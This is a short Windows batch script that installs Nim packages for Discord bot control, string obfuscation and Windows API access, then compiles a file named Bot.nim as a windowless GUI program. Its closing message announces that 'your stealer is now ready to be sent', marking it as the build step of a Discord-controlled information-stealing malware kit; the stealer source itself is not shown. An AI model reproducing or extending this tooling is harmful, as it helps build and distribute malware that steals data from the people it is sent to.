@echo off
cls
chcp 65001 > nul
echo.
echo ┏┓┓    ┓ ┓      [35m┏┓┏┓[0m
echo ┣┫┣┓┏┓┏┫┏┫┏┓┏┓  [35m┃ ┏┛[0m
echo ┛┗┗┛┗┻┗┻┗┻┗┛┛┗  [35m┗┛┗━[0m
echo.                    
echo Installing nim [35mmodules[0m
nimble install dimscord
nimble install nimprotect
nimble install winim
nimble install pixie
echo [92mModules succesfully installed[0m
timeout 2 > nul
cls
echo.
echo ┏┓┓    ┓ ┓      [35m┏┓┏┓[0m
echo ┣┫┣┓┏┓┏┫┏┫┏┓┏┓  [35m┃ ┏┛[0m
echo ┛┗┗┛┗┻┗┻┗┻┗┛┛┗  [35m┗┛┗━[0m
echo.
echo Compiling [35source[0m
nim c --app:gui .\Bot.nim
timeout 2 > nul

echo.
echo.
echo [92mCompiled successfully![0m Your stealer is now ready to be sent. 
echo.
timeout 5 > nul
